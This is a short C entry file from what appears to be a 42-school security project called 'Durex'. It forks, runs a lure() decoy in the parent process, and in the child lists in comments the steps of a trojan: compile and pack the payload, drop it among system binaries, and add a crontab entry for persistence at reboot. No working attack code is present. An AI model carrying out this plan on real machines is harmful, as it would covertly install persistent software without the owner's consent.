/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: bccyv <bccyv@student.42.fr>                +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/11/15 19:18:57 by bccyv             #+#    #+#             */
/*   Updated: 2021/11/15 19:48:27 by bccyv            ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <unistd.h>
#include <durex.h>

int main(void)
{
	int pid;

	pid = fork();
	if (pid > 0)
	{
		lure();
	}
	else
	{
		/*
		 * 1. compile durex.c
		 * 2. pack it and output result in system binaries
		 * 3. Edit crontab to launch Durex at reboot
		 * 4. Launch Durex
		*/
	}
	return (0);
}
